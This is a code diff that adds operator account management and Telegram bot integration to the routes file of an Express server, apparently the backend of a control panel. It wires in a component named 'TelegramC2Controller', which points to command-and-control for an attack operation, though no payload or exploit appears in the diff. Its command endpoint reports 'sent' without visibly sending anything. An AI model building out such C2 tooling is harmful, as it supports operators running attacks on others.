@@ -6,6 +6,7 @@ import session from "express-session";
 import connectPg from "connect-pg-simple";
 import { storage } from "./storage";
 import { insertAdminUserSchema, insertVisitorSchema, insertPacketLogSchema, insertAnalyticsSchema } from "@shared/schema";
+import { TelegramC2Controller, BotUser } from "./telegram-bot";
 
 // Session configuration
 function getSession() {
@@ -49,6 +50,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       methods: ["GET", "POST"]
     }
   });
+
+  // Initialize Telegram C2 Controller
+  const telegramC2 = new TelegramC2Controller(io);
 
   // Setup session middleware
   app.use(getSession());
@@ -268,9 +272,172 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!admin) {
         return res.status(404).json({ message: "Admin not found" });
       }
-      res.json({ id: admin.id, username: admin.username });
+      res.json({ id: admin.id, username: admin.username, role: admin.role || 'admin' });
     } catch (error) {
       res.status(500).json({ message: "Failed to fetch admin data" });
+    }
+  });
+
+  // User Management Routes
+  app.post("/api/admin/users", requireAuth, async (req: any, res) => {
+    try {
+      const { username, password, role, botToken } = req.body;
+      
+      if (!username || !password) {
+        return res.status(400).json({ message: "Username and password required" });
+      }
+
+      // Check if user already exists
+      const existingUser = await storage.getAdminUserByUsername(username);
+      if (existingUser) {
+        return res.status(409).json({ message: "User already exists" });
+      }
+
+      const hashedPassword = await bcrypt.hash(password, 12);
+      
+      const newUser = await storage.createAdminUser({
+        username,
+        password: hashedPassword,
+        role: role || 'operator',
+        telegramBotToken: botToken || null,
+        active: true
+      });
+
+      // Initialize Telegram bot if token provided
+      if (botToken) {
+        await telegramC2.addUser({
+          id: newUser.id,
+          username: newUser.username,
+          chatId: 0, // Will be set when user starts bot
+          botToken,
+          role: role || 'operator',
+          active: true
+        });
+      }
+
+      res.json({ 
+        message: "User created successfully", 
+        user: { 
+          id: newUser.id, 
+          username: newUser.username, 
+          role: newUser.role,
+          hasTelegramBot: !!botToken
+        } 
+      });
+    } catch (error) {
+      console.error("User creation error:", error);
+      res.status(500).json({ message: "Failed to create user" });
+    }
+  });
+
+  app.get("/api/admin/users", requireAuth, async (req, res) => {
+    try {
+      const users = await storage.getAllAdminUsers();
+      const sanitizedUsers = users.map(user => ({
+        id: user.id,
+        username: user.username,
+        role: user.role,
+        active: user.active,
+        lastLogin: user.lastLogin,
+        hasTelegramBot: !!user.telegramBotToken,
+        createdAt: user.createdAt
+      }));
+      
+      res.json(sanitizedUsers);
+    } catch (error) {
+      res.status(500).json({ message: "Failed to fetch users" });
+    }
+  });
+
+  app.put("/api/admin/users/:userId", requireAuth, async (req: any, res) => {
+    try {
+      const { userId } = req.params;
+      const { username, password, role, botToken, active } = req.body;
+      
+      const updateData: any = {};
+      if (username) updateData.username = username;
+      if (password) updateData.password = await bcrypt.hash(password, 12);
+      if (role) updateData.role = role;
+      if (botToken !== undefined) updateData.telegramBotToken = botToken;
+      if (active !== undefined) updateData.active = active;
+      
+      const updatedUser = await storage.updateAdminUser(parseInt(userId), updateData);
+      
+      res.json({ 
+        message: "User updated successfully",
+        user: {
+          id: updatedUser.id,
+          username: updatedUser.username,
+          role: updatedUser.role,
+          active: updatedUser.active
+        }
+      });
+    } catch (error) {
+      res.status(500).json({ message: "Failed to update user" });
+    }
+  });
+
+  app.delete("/api/admin/users/:userId", requireAuth, async (req: any, res) => {
+    try {
+      const { userId } = req.params;
+      await storage.deleteAdminUser(parseInt(userId));
+      await telegramC2.removeUser(parseInt(userId));
+      
+      res.json({ message: "User deleted successfully" });
+    } catch (error) {
+      res.status(500).json({ message: "Failed to delete user" });
+    }
+  });
+
+  // Telegram Integration Routes
+  app.post("/api/admin/telegram/test", requireAuth, async (req: any, res) => {
+    try {
+      const { botToken, chatId } = req.body;
+      
+      // Test bot token validity
+      const testUrl = `https://api.telegram.org/bot${botToken}/getMe`;
+      const response = await fetch(testUrl);
+      const data = await response.json();
+      
+      if (data.ok) {
+        res.json({ 
+          valid: true, 
+          botInfo: data.result,
+          message: "Bot token is valid"
+        });
+      } else {
+        res.json({ 
+          valid: false, 
+          error: data.description,
+          message: "Invalid bot token"
+        });
+      }
+    } catch (error) {
+      res.status(500).json({ message: "Failed to test bot token" });
+    }
+  });
+
+  app.post("/api/admin/telegram/command", requireAuth, async (req: any, res) => {
+    try {
+      const { command, userId } = req.body;
+      
+      // Log telegram command execution
+      await storage.createAnalytics({
+        metric: 'telegram_command_execution',
+        value: JSON.stringify({
+          command,
+          executedBy: req.session.adminId,
+          targetUser: userId,
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      res.json({ 
+        success: true,
+        message: `Command "${command}" sent via Telegram integration`
+      });
+    } catch (error) {
+      res.status(500).json({ message: "Failed to execute Telegram command" });
     }
   });
 
